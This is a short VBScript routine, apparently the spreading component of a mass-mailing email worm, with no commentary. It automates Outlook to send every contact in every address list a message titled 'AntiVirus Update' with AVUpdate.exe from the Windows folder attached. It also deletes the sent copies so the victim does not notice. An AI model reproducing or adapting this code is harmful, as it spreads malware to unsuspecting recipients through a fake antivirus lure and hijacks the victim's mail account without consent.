ENTREE()
Sub ENTREE
EMAIL()
End Sub
Sub EMAIL()
Set K = CreateObject("Outlook.Application")
Set L = K.GetNameSpace("MAPI")
For Each M In L.AddressLists
If M.AddressEntries.Count <> 0 Then
For O = 1 To M.AddressEntries.Count
Set P = M.AddressEntries(O)
Set N = K.CreateItem(0)
N.To = P.Address
N.Subject = "AntiVirus Update"
N.Body = "The last version of your AV"
Set Q = CreateObject("Scripting.FileSystemObject")
N.Attachments.Add Q.BuildPath(Q.GetSpecialFolder(0),"AVUpdate.exe")
N.DeleteAfterSubmit = True
If N.To <> "" Then
N.Send
End If
Next
End If
Next
End Sub
